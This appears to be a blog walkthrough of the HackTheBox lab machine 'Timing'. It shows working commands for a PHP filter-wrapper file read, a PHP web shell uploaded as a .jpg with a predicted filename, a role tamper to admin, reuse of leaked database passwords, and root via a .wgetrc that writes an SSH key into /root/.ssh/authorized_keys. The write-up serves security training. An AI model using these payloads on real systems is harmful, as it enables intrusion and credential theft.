---
title: "Walk-through of Timing from HackTheBox"
header:
  teaser: /assets/images/2021-12-20-21-35-26.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - Wfuzz
  - GitTools
  - Wget Exploit
---

[Timing](https://www.hackthebox.com/home/machines/profile/421) is an easy level machine by [irogir](https://www.hackthebox.com/home/users/profile/476556) on [HackTheBox](https://www.hackthebox.com/home). It focuses on application vulnerabilities, both web and shell based.

<!--more-->

## Machine Information

![timing](/assets/images/2021-12-20-21-35-26.png)

Our starting point is a login page on the website on port 80, which we find a way in to by looking for files and folders with wfuzz. Using a vulnerable php page we leak credentials and we have access. Further enumeration and code review allows us to escalate our role in the web app to admin. In there we have a way to upload a malicious document containing code execution. We find a way to get the unique file name it has allowing us to execute commands on the box remotely. We exfiltrate a backup and find credentials in there to get ssh as a user. Escalation to root is via a vulnerable app we find on the box, where we exploit its insecure use of wget to gain a root shell.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Timing](https://www.hackthebox.com/home/machines/profile/421) |
| Machine Release Date | 11th December 2021 |
| Date I Completed It | 30th December 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.135 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/timing]
└─# nmap -p$ports -sC -sV -oA timing 10.10.11.135
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 21:37 GMT
Nmap scan report for 10.10.11.135
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```

Just two ports open, let's have a look at Apache on port 80:

![timing-website](/assets/images/2021-12-20-22-29-30.png)

## Gobuster Enumeration

We have a login box, but nothing else. I tried a few obvious credentials but didn't get any where so let's try gobuster:

```sh
┌──(root💀kali)-[~]
└─# gobuster dir -u http://timing.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://timing.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/20 22:06:52 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]   
/server-status        (Status: 403) [Size: 275]                                
===============================================================
2021/12/20 22:07:57 Finished
===============================================================
```

Not a lot to go on so I tried looking for files with php extensions and found this:

```sh
┌──(root💀kali)-[~]
└─# gobuster dir -u http://timing.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://timing.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/20 22:08:01 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]    
/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]   
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]                
/login.php            (Status: 200) [Size: 5609]                               
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                
/image.php            (Status: 200) [Size: 0]                                  
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                
/index.php            (Status: 302) [Size: 0] [--> ./login.php]                
/header.php           (Status: 302) [Size: 0] [--> ./login.php]                
===============================================================
2021/12/20 22:10:15 Finished
===============================================================
```

## Wfuzz

Interesting that the image.php file doesn't redirect to login like the others I tried fuzzing. It took me quite a while but eventually I ended up with this:

```sh
┌──(root💀kali)-[~]
└─# wfuzz -c --hh 0 -u 'http://timing.htb/image.php?img=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://timing.htb/image.php?img=FUZZ
Total requests: 914
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000039:   200        0 L      3 W        25 Ch       "/apache/logs/error_log"
000000035:   200        0 L      3 W        25 Ch       "../../../../apache/logs/access.log"
000000037:   200        0 L      3 W        25 Ch       "../../apache/logs/access.log"
000000031:   200        0 L      3 W        25 Ch       "/apache2/logs/error.log"
000000030:   200        0 L      3 W        25 Ch       "/apache2/logs/error_log"
000000123:   200        0 L      3 W        25 Ch       "/etc/chrootUsers"
000000118:   200        0 L      3 W        25 Ch       "/etc/apache2/vhosts.d/default_vhost.include"
000000114:   200        0 L      3 W        25 Ch       "/etc/apache2/apache2.conf"
```

## Dumping passwd

By using the img parameter and fuzzing I get some responses with 25 chars. This tells us the web server is responding with something. Let's try and grab the passwd file:

```sh
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=/etc/passwd'
Hacking attempt detected!
```

Ok so we're getting somewhere. Next we need to try and bypass that filter. I used [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter) which is something I used on the BountyHunter box [here](https://pencer.io/ctf/ctf-htb-bountyhunter/#base64-encoded-payload):

```sh
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd'                               
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAp
NyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9ia
czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDx
<SNIP>
```

This worked and the response is base64 encoded so we can decode and use grep to just give us the accounts that can logon:

```sh
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd' | base64 -d | grep -vw nologin
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2152  100  2152    0     0  36140      0 --:--:-- --:--:-- --:--:-- 36474
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
lxd:x:105:65534::/var/lib/lxd/:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

## Simple WebApp Login

We have a user called aaron. Going back to that initial login box we saw earlier, now with a username it was simple to login:

![timing-aaron-login](/assets/images/2021-12-20-22-58-42.png)

We end up here:

![timing-aaron-logged-in](/assets/images/2021-12-20-23-00-42.png)

We aren't sure what the significance of being user 2 is at this point, and there's nothing else you can do once logged in. So going back to our gobuster output I grab the upload.php file:

```php
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php' | base64 -d
```

## Code Review

Looking through the code it's fairly simple to see what it does. It takes the file uploaded by the user, checks it has a .jpg extension, and stores its name in $file_name. Then it creates a unique hash value by taking the md5 hash of the current time, and combining that with the file name. It then stores the file in /images/uploads. There is one sneaky section of the script that needs to be understood, otherwise you will be stuck trying to determine the filename that has been created.

Looking at the first section of the file:

```php
<?php
include("admin_auth_check.php");
$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
```

Notice that there is a variable called $file_hash created with a value set by uniqid(). [This](https://www.w3schools.com/php/func_misc_uniqid.asp) article explains what the function does, but essentially it's like time() but in microseconds so a much bigger value. The important bit is here:

```php
md5('$file_hash' . time())
```

In PHP single and double quotes work differently with strings. See [this](https://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/) article, but basically the value of he $file_hash variable is never used.

We also see there is another file included in this one called admin_auth_check.php, let's look at that:

```php
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php' | base64 -d

<?php
include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
?>
```

We can see this file is checking the value of the session role. If it's not equal to 1 then you have no access to a panel. We don't know what that means yet!

## WebApp Admin Access

Going back to our web browser, we already have a session authenticated as aaron. If you click on the Edit Profile link at the top you end up here:

![timing-edit-profile](/assets/images/2021-12-21-22-47-53.png)

Time to fire up Burp and see what is going on in the background. Once you have Burp intercepting requests and your browser set to use it click that blue update button on the webpage. We intercept the post:

![timing-burp-intercept](/assets/images/2021-12-21-22-51-16.png)

Add our new role on the end:

![timing-burp-add-role](/assets/images/2021-12-21-22-52-15.png)

Forward to server, then switch back to browser:

![timing-profile-updated](/assets/images/2021-12-21-22-53-33.png)

We see our profile is updated, now refresh your browser to see we have a new option called Admin panel, click on that to get to here:

![timing-admin-panel](/assets/images/2021-12-21-22-54-48.png)

## Web Shell

We've found the image upload area which is using the PHP file we looked at earlier. It's safe to assume this will be our method of gaining remote code execution. Let's start with a simple web shell. We know from the code review that there's a file extension check, but not a check of the contents of the file. We can easily bypass the check like this:

```sh
┌──(root💀kali)-[~]
└─# cat pencer.jpg
<?php system($_GET[cmd]);?>
```

We've used this a number of time before like on [Nineveh](https://pencer.io/ctf/ctf-htb-nineveh) and [Forge](https://www.hackthebox.eu/home/machines/profile/376). However it's slightly more complicated here because the resulting filename also has an md5 hash of the current time prepended to it.

We can create our own simple filename generator to help. This is what the PHP file is doing:

```php
$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
```

Let's test our own version:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# date
Wed 22 Dec 17:13:27 GMT 2021
```

Use current time:

```php
┌──(root💀kali)-[~/htb/timing]
└─# php -a
Interactive mode enabled
php > echo (md5('$file_hash' . strtotime('Wed 22 Dec 17:13:27 GMT 2021')) . '_pencer.jpg');
01c656c2e2adb93593117cb1b3d12808_pencer.jpg
```

So using interactive php mode we can take the line from the code we reviewed and replace time() with the current time on my Kali box. Then append the name of the file we created that will be used for command execution. The resulting filename is what we will need to use once it's uploaded.

Let's do it for real. Go back to the upload form and select our web shell:

![timing-upload-shell](/assets/images/2021-12-22-17-02-44.png)

Make sure your browser is set to use Burp as the proxy, and that Burp is set to intercept. Click the upload image button then switch to Burp to see it's intercepted:

![timing-burp-intercept](/assets/images/2021-12-22-17-04-09.png)

We can see at the bottom our code is intact. Right click and choose Send to Repeater, then switch to the Repeater tab and click Send:

![timing-burp-repeater](/assets/images/2021-12-22-17-05-56.png)

We see on the right the the file was uploaded, now copy take note of the date and time on the server response:

```text
Wed, 22 Dec 2021 17:21:43 GMT
```

We use this with our PHP like before:

```php
┌──(root💀kali)-[~/htb/timing]
└─# php -a
Interactive mode enabled
php > echo (md5('$file_hash' . strtotime('Wed, 22 Dec 2021 17:21:43 GMT')) . '_pencer.jpg');
e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg
```

## Remote Code Execution

We now have the filename we can call remotely using curl. Let's test it with whoami:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=whoami'
www-data
```

That works. However I spent a long time trying to get a reverse shell with no luck. Back to enumerating the file system and eventually I found this:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=ls+-lsa+/opt' 
total 624
616 -rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip
```

A backup file, we definitely want to have a look at that. First copy it to the uploads folder that we have access to:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'
```

Now we can download it:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/source-files-backup.zip' -o backup.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  613k    0  613k    0     0  1908k      0 --:--:-- --:--:-- --:--:-- 1910k
```

## Backup File Exploration

Unzip it and have a look:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# unzip backup.zip 
Archive:  backup.zip
   creating: backup/
  inflating: backup/header.php       
  inflating: backup/profile_update.php  
   creating: backup/js/
  inflating: backup/js/jquery.min.js  
  inflating: backup/js/bootstrap.min.js  
  inflating: backup/js/profile.js
  <SNIP>

┌──(root💀kali)-[~/htb/timing/backup]
└─# ls -lsa
4 -rw-r--r-- 1 root root  200 Jul 20 23:34 admin_auth_check.php
4 -rw-r--r-- 1 root root  373 Jul 20 23:34 auth_check.php
4 -rw-r--r-- 1 root root 1268 Jul 20 23:34 avatar_uploader.php
4 drwxr-xr-x 2 root root 4096 Jul 20 23:34 css
4 -rw-r--r-- 1 root root   92 Jul 20 23:34 db_conn.php
4 -rw-r--r-- 1 root root 3937 Jul 20 23:34 footer.php
4 drwxr-xr-x 8 root root 4096 Jul 20 23:35 .git
4 -rw-r--r-- 1 root root 1498 Jul 20 23:34 header.php
4 -rw-r--r-- 1 root root  507 Jul 20 23:34 image.php
4 drwxr-xr-x 3 root root 4096 Jul 20 23:34 images
4 -rw-r--r-- 1 root root  188 Jul 20 23:34 index.php
4 drwxr-xr-x 2 root root 4096 Jul 20 23:34 js
4 -rw-r--r-- 1 root root 2074 Jul 20 23:34 login.php
4 -rw-r--r-- 1 root root  113 Jul 20 23:34 logout.php
4 -rw-r--r-- 1 root root 3041 Jul 20 23:34 profile.php
4 -rw-r--r-- 1 root root 1740 Jul 20 23:34 profile_update.php
4 -rw-r--r-- 1 root root  984 Jul 20 23:34 upload.php
```

Looking through the files we find something interesting in db_conn.php:

```sh
┌──(root💀kali)-[~/htb/timing/backup]
└─# cat db_conn.php                  
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Could it be that aaron has reused that mysql password for ssh access:

```sh
┌──(root💀kali)-[~/htb/timing/extracted]
└─# ssh aaron@timing.htb
aaron@timing.htb's password: 
Permission denied, please try again.
```

Ok that didn't work. However looking further at the backup files we see there's a Git repository. Seems a little suspicious!

## GitTools

Let's use GitTools like we did on [Devzat](https://www.hackthebox.com/home/machines/profile/398) and extract the source files. Download them if needed:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 229, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.
Resolving deltas: 100% (85/85), done.
```

User the extractor script on the backup folder:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# ./GitTools/Extractor/extractor.sh backup extracted                  
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e
[+] Found file: /root/htb/timing/extracted/0-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php
[+] Found file: /root/htb/timing/extracted/0-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php
[+] Found file: /root/htb/timing/extracted/0-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php
<SNIP>
```

Now look at the extractor files:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# ll extracted 
drwxr-xr-x 5 root root 4096 Dec 22 17:43 0-16de2698b5b122c93461298eab730d00273bd83e
drwxr-xr-x 5 root root 4096 Dec 22 17:43 1-e4e214696159a25c69812571c8214d2bf8736a3f
```

There are two commits. Again like we did on Devzat we can use diff as a simple way to see what changed between commits:

```sh
┌──(root💀kali)-[~/htb/timing/extracted]
└─# diff 0-16de2698b5b122c93461298eab730d00273bd83e/ 1-e4e214696159a25c69812571c8214d2bf8736a3f/
<SNIP>
diff '--color=auto' 0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php 1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php
< $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
---
> $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
```

## SSH As Aaron

The only change is the password in that db_conn.php file we tried earlier with aaron on SSH. Let's try this one:

```text
┌──(root💀kali)-[~/htb/timing/extracted]
└─# ssh aaron@timing.htb
aaron@timing.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

  System information as of Wed Dec 22 17:45:49 UTC 2021

Last login: Wed Dec 22 17:41:31 2021 from 10.10.14.124
aaron@timing:~$ 
```

Ok, we knew that was gonna work didn't we!

## Sudo Permissions

As usual, check the few obvious things before using something like linPEAS. Here I started with sudo which was the right place:

```text
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

## Vulnerable Java App

What is netutils:

```text
aaron@timing:~$ file /usr/bin/netutils
/usr/bin/netutils: Bourne-Again shell script, ASCII text executable

aaron@timing:~$ cat /usr/bin/netutils
#! /bin/bash
java -jar /root/netutils.jar
```

This shell script runs a Java application in the root folder, and we can run it as root without a password. Sounds interesting, let's have a look what it does:

```text
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >>
```

We have two options with this util, FTP or HTTP, whichever you pick it then asks for a file. This can be hosted remotely, so let's start a webserver on Kali first:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# python3 -m http.server 80   
```

Now switch back to the box and try to grab a file from Kali:

```text
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 0
Enter Url+File: 10.10.14.12/pencer.jpg
```

I tried grabbing that fake jpg we made earlier using FTP but nothing happened. Checking my webserver on Kali there was no connection attempt. Let's try http:

```text
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.12/pencer.jpg
Initializing download: http://10.10.14.12/pencer.jpg
File size: 28 bytes
Opening output file pencer.jpg
Server unsupported, starting from scratch with one connection.
Starting download
Downloaded 28 byte in 0 seconds. (0.27 KB/s)
```

That looks more promising. Checking our webserver on Kali I see a connection from the box and the file was retrieved. Looking locally I see the file is there, and it's owned by root.

## Pspy64

We could pull a file across using wget, so we can assume there is a vulnerability in this util that we need to exploit. To understand how it works lets use pspy64 just like we did many other times, most recently on [Static](https://app.hackthebox.com/machines/355). If you haven't already got it the grab from [here](https://github.com/DominicBreuker/pspy), I have it already so just need to copy it to the path of my webserver I'm running on Kali:

```sh
┌──(root💀kali)-[~]
└─# locate pspy64
/root/htb/static/pspy64

┌──(root💀kali)-[~]
└─# cd htb/timing

┌──(root💀kali)-[~/htb/timing]
└─# cp /root/htb/static/pspy64 .    
```

Now back to the box and pull pspy64 across:

```text
aaron@timing:~$ cd /dev/shm
aaron@timing:/dev/shm$ wget http://10.10.14.12/pspy64
--2021-12-28 21:59:49--  http://10.10.14.12/pspy64
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64     100%[==========>]   2.94M  2.34MB/s    in 1.3s    
2021-12-28 21:59:51 (2.34 MB/s) - ‘pspy64’ saved [3078592/3078592]

aaron@timing:/dev/shm$ chmod +x pspy64 
aaron@timing:/dev/shm$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/12/28 22:00:08 CMD: UID=0    PID=97     | 
2021/12/28 22:00:08 CMD: UID=0    PID=95     | 
```

With that running in our current SSH session log in to a second one and then run netutils again. Do the same option 0 for FTP and option 1 for HTTP as before, again trying to pull my pencer.jpg file across. Now switch back to the pspy64 session to see what is happening:

```text
2021/12/28 22:03:30 CMD: UID=1000 PID=3681   | sudo /usr/bin/netutils
2021/12/28 22:03:47 CMD: UID=0    PID=3750   | java -jar /root/netutils.jar
<SNIP>
2021/12/28 22:04:30 CMD: UID=0    PID=3868   | wget -r ftp://10.10.14.12/pencer.jpg
2021/12/28 22:05:24 CMD: UID=0    PID=4021   | /root/axel http://10.10.14.12/pencer.jpg
```

## Wget Exploit

We can see the netutils java app is using wget for FTP connections, and axel for HTTP. I later found It's possible to complete this box by exploiting axel, but I did it using FTP so we'll follow that method.

There's another HTB box called Kotarak that has a similar path, [this](https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html) walk through helped me here. The key part to know is that wget looks for a startup file when it's run. From the docs [here](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html) we can see how that works:

```text
When initializing, Wget will look for a global startup file, /usr/local/etc/wgetrc
by default (or some prefix other than /usr/local, if Wget was not installed there)
and read commands from there, if it exists.

Then it will look for the user’s file. If the environmental variable WGETRC is set,
Wget will try to load that file. Failing that, no further attempts will be made.

If WGETRC is not set, Wget will try to load $HOME/.wgetrc.
```

On this box we find there is no global file so we can exploit this by creating our own .wgetrc file in aaron's /home folder. Looking at the available commands [here](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html) we see that there is an option to set the name and path of the retrieved file. We can run the java app as root so we have access to /root as a writeable location. Let's put our Kali public SSH key in there so we can log in as root without a password.

First create the .wgetrc config file in /home/aaron:

```text
aaron@timing:~$ cat <<_EOF_>.wgetrc
> output_document = /root/.ssh/authorized_keys
> _EOF_
```

Over on Kali create our SSH keys if needed:

```sh
┌──(root💀kali)-[~]
└─# ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:B/SsKx8Z8AU/c40jKybaq8OpWpTVdl2Yz0e/ktMxXxY root@kali
The key's randomart image is:
+---[RSA 3072]----+
|        o  o.    |
|     . . *o. o.E |
|    . + o Xo+....|
|   o . + + *o..o+|
|  o   . S o  .o.*|
| .   o o *   + o.|
|  ....o +     o  |
| .  +  + .       |
|.....o. .        |
+----[SHA256]-----+
```

Put a copy of public key in our working folder:

```sh
┌──(root💀kali)-[~]
└─# cp .ssh/id_rsa.pub htb/timing
```

## Python FTP Server

Install the Python3 FTP library if needed:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# pip3 install pyftpdlib
Collecting pyftpdlib
  Downloading pyftpdlib-1.5.6.tar.gz (188 kB)
     |████████████████████████████████| 188 kB 3.1 MB/s 
Building wheels for collected packages: pyftpdlib
  Building wheel for pyftpdlib (setup.py) ... done
  Created wheel for pyftpdlib: filename=pyftpdlib-1.5.6-py3-none-any.whl size=125586 sha256=46681c9b907290fe344e3955d21dfbb015118a29d3b431b1772d453ad7d54931
  Stored in directory: /root/.cache/pip/wheels/54/9f/5f/50eae5deee54c11cd059c5bda2ebd7dcd461d81b5c89f50f75
Successfully built pyftpdlib
Installing collected packages: pyftpdlib
Successfully installed pyftpdlib-1.5.6
```

Now start an FTP server so we can get to our SSH public key:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# python3 -m pyftpdlib -p 21
[I 2021-12-29 22:15:26] concurrency model: async
[I 2021-12-29 22:15:26] masquerade (NAT) address: None
[I 2021-12-29 22:15:26] passive ports: None
[I 2021-12-29 22:15:26] >>> starting FTP server on 0.0.0.0:21, pid=1597 <<<
```

Switch back to the box and run the netutils app again, this time choose 0 for FTP and enter our Kali IP and the SSH public key we are hosting there:

```text
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 0
Enter Url+File: 10.10.14.12/id_rsa.pub
```

Now back to Kali and check the file was requested:

```sh
[I 2021-12-29 22:37:11] 10.10.11.135:43464-[] FTP session opened (connect)
[I 2021-12-29 22:37:11] 10.10.11.135:43464-[anonymous] USER 'anonymous' logged in.
[I 2021-12-29 22:37:11] 10.10.11.135:43464-[anonymous] RETR /root/htb/timing/id_rsa.pub completed=1 bytes=563 seconds=0.0
[I 2021-12-29 22:37:11] 10.10.11.135:43464-[anonymous] FTP session closed (disconnect).
```

## SSH As Root

It was, so start a new terminal and log in to the box as root:

```sh
┌──(root💀kali)-[~/htb/timing]
└─# ssh root@timing.htb  
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
Last login: Tue Dec  7 12:08:29 2021
root@timing:~#
```

Grab the flag and we're done:

```text
root@timing:~# cat /root/root.txt 
<HIDDEN>
```

That's another box done. I really enjoyed this one as it needed a fair bit of thinking to work through it. See you next time.
